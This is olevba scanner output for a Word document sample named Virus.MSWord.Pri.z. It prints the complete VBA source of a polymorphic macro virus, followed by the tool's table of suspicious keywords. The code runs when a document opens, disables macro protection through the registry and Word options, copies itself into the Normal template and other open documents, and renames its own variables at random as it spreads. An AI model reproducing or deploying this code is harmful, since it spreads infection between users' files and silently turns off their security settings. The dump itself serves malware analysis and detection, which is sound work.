olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.z-e4aceb59fb95390804bbc5b431e7ddb2e3931799
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.z-e4aceb59fb95390804bbc5b431e7ddb2e3931799 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next: Randomize
Const Ve599148 = "9.0", Le725352 = "Macro", Jx370740 = 3, Lw258201 = 0, Au336951 = &H1, Bo669866 = 1
If Application.Version = Ve599148 Then
CommandBars(Le725352).Controls(Jx370740).Enabled = (Rnd * Lw258201)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = Au336951
Else
Options.VirusProtection = (Rnd * Lw258201)
End If
Options.SaveNormalPrompt = (Rnd * Lw258201)
Set Sf57356 = ThisDocument.VBProject.VBComponents(Bo669866).CodeModule
If MacroContainer = ActiveDocument Then Set Rm11693 = NormalTemplate.VBProject.VBComponents(Bo669866).CodeModule Else Set Rm11693 = ActiveDocument.VBProject.VBComponents(Bo669866).CodeModule: Qe468747 = (Rnd * Bo669866)
If Sf57356.countoflines <> Rm11693.countoflines Then
Rm11693.deletelines Bo669866, Rm11693.countoflines
Rm11693.insertlines Bo669866, Nw53841(Sf57356.lines(Bo669866, Sf57356.countoflines))
If Qe468747 <> Lw258201 Then ActiveDocument.SaveAs ActiveDocument.FullName
End If
If Day(Now()) = Hour(Now()) Then
ActiveDocument.Shapes.AddShape(msoShapeSun, 160.05, 99.2, 342#, 117#).Select
With Selection
.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, Lw258201)
.ShapeRange.TextFrame.TextRange.Select
.TypeText Text:="Class97/2K.Sun" & Chr(11) & "by jackie twoflower" & Chr(11) & "Lz0NT/MVT"
.ParagraphFormat.Alignment = wdAlignParagraphCenter
End With
End If
End Sub
Private Function Nw53841(Vg813412) As String ' PVP v1.1
Const Lw258201 = 0, Bo669866 = 1, Gv23294 = 21, Dj66244 = 22, Ss45375 = 65, Ok831795 = 122, Gt820969 = 999
Dim Le946218(Bo669866 To Gv23294)
Le946218(1) = "Ve599148": Le946218(2) = "Le725352": Le946218(3) = "Jx370740": Le946218(4) = "Lw258201": Le946218(5) = "Au336951": Le946218(6) = "Bo669866": Le946218(7) = "Sf57356": Le946218(8) = "Rm11693"
Le946218(9) = "Gv23294": Le946218(10) = "Dj66244": Le946218(11) = "Ss45375": Le946218(12) = "Ok831795": Le946218(13) = "Gt820969": Le946218(14) = "Nw53841": Le946218(15) = "Le946218": Le946218(16) = "Kw691591"
Le946218(17) = "Rv887223": Le946218(18) = "Km438468": Le946218(19) = "Gk687354": Le946218(20) = "Vg813412": Le946218(21) = "Qe468747"
For Kw691591 = Bo669866 To Gv23294
Rv887223 = Chr(Ss45375 + Int(Rnd * Dj66244)) & Chr(Ok831795 - Int(Rnd * Dj66244)) & Int(Rnd * Gt820969) & Int(Rnd * Gt820969)
Km438468 = Bo669866
Gk687354: Km438468 = InStr(Km438468 + Bo669866, Vg813412, Le946218(Kw691591))
If Km438468 <> Lw258201 Then Vg813412 = Mid(Vg813412, Bo669866, (Km438468 - Bo669866)) & Rv887223 & Mid(Vg813412, (Km438468 + Len(Le946218(Kw691591))), Len(Vg813412)): GoTo Gk687354
Next
Nw53841 = Vg813412
End Function
' Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT
' Freedom will only be available through revolution or death...

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

